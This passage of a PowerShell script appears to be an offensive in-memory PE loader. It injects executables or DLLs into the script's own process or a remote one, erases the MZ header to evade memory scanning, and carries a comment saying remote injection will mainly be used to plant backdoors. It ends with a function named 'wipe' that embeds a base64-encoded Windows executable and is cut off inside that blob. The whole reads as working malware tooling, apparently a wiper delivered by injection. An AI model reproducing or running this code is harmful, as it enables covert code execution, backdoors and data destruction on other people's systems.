		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | Add-Member -MemberType NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"
		
		
		#Copy each section from the PE in to memory
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types
		
		
		#Update the memory addresses hardcoded in to the PE based on the memory address the PE was expecting to be loaded to vs where it was actually loaded
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		#The PE we are in-memory loading has DLLs it needs, import those DLLs for it
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		#Update the memory protection flags for all the memory just allocated
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		#If remote loading, copy the DLL in to remote process memory
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		#Call the entry point, if this is a DLL the entrypoint is the DllMain function, if it is an EXE it is the Main function
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = Add-SignedIntAsUnsigned ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					#Shellcode: CallDllMain.asm
					$CallDllMainSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			#Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			#If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
			#	This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Call FreeLibrary for all the imports of the DLL
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		#Call DllMain with process detach
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		#If a remote process to inject in to is specified, get a handle to it
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
		#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
#		if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
#		{
#			Write-Verbose "Getting SeDebugPrivilege"
#			Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
#		}	
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		#Load the PE reflectively
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
	        switch ($FuncReturnType)
	        {
	            'WString' {
	                Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				    Write-Output $Output
	            }

	            'String' {
	                Write-Verbose "Calling function with String return type"
				    [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
				    if ($StringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
				    $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
				    [IntPtr]$OutputPtr = $StringFunc.Invoke()
				    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
				    Write-Output $Output
	            }

	            'Void' {
	                Write-Verbose "Calling function with Void return type"
				    [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
				    if ($VoidFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $VoidFuncDelegate = Get-DelegateType @() ([Void])
				    $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
				    $VoidFunc.Invoke() | Out-Null
	            }
	        }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process or if it is an EXE.
        #Note that all DLL's loaded by the EXE will remain loaded in memory.
		if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Delete the PE file from memory.
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	
	#Verify the image is a valid PE file
	$e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''

    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }

	if (-not $DoNotZeroMZ) {
		# Remove 'MZ' from the PE file so that it cannot be detected by .imgscan in WinDbg
		# TODO: Investigate how much of the header can be destroyed, I'd imagine most of it can be.
		$PEBytes[0] = 0
		$PEBytes[1] = 0
	}
	
	#Add a "program name" to exeargs, just so the string looks as normal as possible (real args start indexing at 1)
	if ($ExeArgs -ne $null -and $ExeArgs -ne '')
	{
		$ExeArgs = "ReflectiveExe $ExeArgs"
	}
	else
	{
		$ExeArgs = "ReflectiveExe"
	}

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
	}
	else
	{
		Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
	}
}

Main
}
function wipe {
	[CmdletBinding()] param (
		[string] $FilePath
	)
	$InputString = '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